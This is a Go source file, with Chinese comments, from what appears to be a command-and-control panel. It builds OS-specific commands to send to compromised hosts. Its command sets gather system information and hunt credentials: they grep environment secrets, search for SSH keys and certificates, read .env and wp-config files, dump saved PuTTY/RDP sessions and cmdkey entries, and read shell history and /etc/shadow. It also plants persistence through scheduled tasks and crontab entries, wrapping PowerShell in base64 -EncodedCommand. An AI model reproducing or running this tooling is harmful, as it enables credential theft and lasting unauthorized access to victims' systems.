package server

// c2_os.go — C2 面板/插件的目标 OS 适配：命令集按会话 osType 分派。
// Windows 控制台输出 GBK 已在 beacon 侧（pkg/tasks toUTF8）统一转 UTF-8，
// 这里只负责"发对命令"。Windows 复杂逻辑（定时任务枚举/删除）用 PowerShell
// 单引号内嵌，经 cmd /C 透传（$ 与 () 在 cmd 双引号内均为字面量）。

import (
	"context"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"strings"
	"unicode/utf16"
)


// psOneLiner 把 PowerShell 脚本包成 -EncodedCommand（base64 UTF-16LE）。
// 直接 -Command "..." 传 cmd /C 时 $var 会被 PS 命令行层展开吃掉（实测），
// 编码传输彻底规避引号/变量转义问题。
func psOneLiner(script string) string {
	// 抑制进度/警告流：重定向下会以 CLIXML 噪音混入输出（模块首次加载进度等）
	script = "$ProgressPreference='SilentlyContinue';$WarningPreference='SilentlyContinue';" + script
	u16 := utf16.Encode([]rune(script))
	b := make([]byte, len(u16)*2)
	for i, v := range u16 {
		binary.LittleEndian.PutUint16(b[i*2:], v)
	}
	return "powershell -NoProfile -EncodedCommand " + base64.StdEncoding.EncodeToString(b)
}

// c2IsWin 判断会话目标是否 Windows（按 goc2 clients 的 osType 字段）。
func (s *Server) c2IsWin(ctx context.Context, sessionID string) bool {
	clients, err := c2Client().ListClients(ctx, nil)
	if err != nil {
		return false
	}
	for _, c := range clients {
		m, ok := c.(map[string]any)
		if !ok {
			continue
		}
		if id, _ := m["id"].(string); id == sessionID {
			os, _ := m["osType"].(string)
			return strings.Contains(strings.ToLower(os), "win")
		}
	}
	return false
}

// c2SysinfoCmds 系统信息快照命令集。
func c2SysinfoCmds(isWin bool) []string {
	if isWin {
		return c2WinCmds(
			"systeminfo",
			"whoami && hostname",
			"ipconfig /all",
			"tasklist /FO CSV /NH",
			"netstat -ano | findstr LISTENING",
			"wmic logicaldisk get caption,freespace,size",
			"net user",
			"ps:Get-ScheduledTask | Select-Object -First 25 TaskName,State | Format-Table -AutoSize",
			"set | findstr /I \"PASS SECRET TOKEN KEY\"",
		)
	}
	return []string{
		"uname -a",
		"cat /etc/os-release 2>/dev/null | head -5",
		"id && whoami",
		"ip -4 addr show 2>/dev/null || ifconfig",
		"cat /etc/resolv.conf 2>/dev/null | head -5",
		"ps aux --sort=-%cpu | head -20",
		"netstat -tlnp 2>/dev/null | head -20",
		"df -h / /tmp 2>/dev/null",
		"free -m 2>/dev/null",
		"crontab -l 2>/dev/null | head -10",
		"systemctl list-units --type=service --state=running 2>/dev/null | head -15",
		"docker ps 2>/dev/null | head -10",
		"env | grep -iE 'PASS|SECRET|TOKEN|KEY' | head -10",
	}
}

// c2SensitiveCmds 敏感文件扫描命令集。
func c2SensitiveCmds(isWin bool) []string {
	if isWin {
		return c2WinCmds(
			"dir /s /b %USERPROFILE%\\.ssh 2>nul",
			"ps:Get-ChildItem -Path C:\\Users -Recurse -Depth 4 -Include id_rsa,*.pem,*.ppk,*.pfx -ErrorAction SilentlyContinue | Select-Object -First 15 -ExpandProperty FullName",
			"ps:Get-ChildItem -Path C:\\,C:\\inetpub,C:\\Users -Recurse -Depth 3 -Include .env,web.config,wp-config.php,database.yml -ErrorAction SilentlyContinue | Select-Object -First 15 -ExpandProperty FullName",
			"cmdkey /list",
			"reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions 2>nul",
			"reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\" 2>nul",
			"ps:$h=$env:APPDATA+'\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'; if(Test-Path $h){Get-Content $h -Tail 30}",
			"net share",
		)
	}
	return []string{
		"find / -maxdepth 4 \\( -name 'id_rsa' -o -name '*.pem' -o -name '*.key' -o -name '*.p12' \\) -type f 2>/dev/null | head -15",
		"find / -maxdepth 3 \\( -name '.env' -o -name 'wp-config.php' -o -name 'config.php' -o -name 'database.yml' -o -name 'settings.py' \\) 2>/dev/null | head -15",
		"ls -la ~/.ssh/ 2>/dev/null",
		"cat ~/.bash_history 2>/dev/null | tail -30",
		"find /var/log -name '*.log' -newer /etc/hostname 2>/dev/null | head -10",
		"grep -r 'password' /etc/shadow /etc/sudoers 2>/dev/null | head -5",
		"find /tmp /var/tmp -type f -executable 2>/dev/null | head -10",
	}
}

// c2ScheduleCmd 定时任务命令构造（Windows=ScheduledTask（PS），Linux=crontab）。
// FORANG_SCH 前缀双平台统一；Windows 侧 ls 带序号，rm 按序号删。
func c2ScheduleCmd(isWin bool, action string, intervalSec int, cmdText string, jobID int) string {
	if isWin {
		switch action {
		case "add":
			// ScheduledTask 重复间隔最小 1 分钟
			mins := intervalSec / 60
			if mins < 1 {
				mins = 1
			}
			return psOneLiner(fmt.Sprintf(`$a=New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c %s';$t=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes %d);$s=New-ScheduledTaskSettingsSet -StartWhenAvailable;Register-ScheduledTask -TaskName ('FORANG_SCH_'+(Get-Random)) -Action $a -Trigger $t -Settings $s | Select-Object TaskName`,
				strings.ReplaceAll(cmdText, "'", "''"), mins))
		case "ls":
			return psOneLiner(`$i=0;Get-ScheduledTask -TaskName 'FORANG_SCH*' -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | ForEach-Object { $i++; Write-Output ('' + $i + ': ' + $_.TaskName + ' -> ' + $_.Actions.Execute + ' ' + $_.Actions.Arguments) }; if($i -eq 0){Write-Output '(no FORANG_SCH tasks)'}`)
		case "rm":
			return psOneLiner(fmt.Sprintf(`$j=Get-ScheduledTask -TaskName 'FORANG_SCH*' -ErrorAction SilentlyContinue -WarningAction SilentlyContinue; if($j[%d]){Unregister-ScheduledTask -TaskName $j[%d].TaskName -Confirm:$false; Write-Output ('removed ' + $j[%d].TaskName)} else {Write-Output 'job not found'}`,
				jobID-1, jobID-1, jobID-1))
		case "clear":
			return psOneLiner(`Get-ScheduledTask -TaskName 'FORANG_SCH*' -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false; Write-Output 'cleared'`)
		}
		return ""
	}
	switch action {
	case "add":
		return fmt.Sprintf("(crontab -l 2>/dev/null | grep -v 'FORANG_SCH'; echo '*/%d * * * * %s # FORANG_SCH') | crontab -",
			intervalSec/60, cmdText)
	case "ls":
		return `crontab -l 2>/dev/null | grep FORANG_SCH | nl`
	case "rm":
		return fmt.Sprintf("crontab -l 2>/dev/null | sed '%dd' | crontab -; echo \"job %d removed\"", jobID, jobID)
	case "clear":
		return `crontab -l 2>/dev/null | grep -v FORANG_SCH | crontab -; echo "cleared"`
	}
	return ""
}

// c2WinCmds Windows 命令集构造：ps: 前缀行转 -EncodedCommand（$ 安全），
// 其余原样（cmd 内置命令）。
func c2WinCmds(items ...string) []string {
	out := make([]string, 0, len(items))
	for _, it := range items {
		if strings.HasPrefix(it, "ps:") {
			out = append(out, psOneLiner(strings.TrimPrefix(it, "ps:")))
			continue
		}
		out = append(out, it)
	}
	return out
}
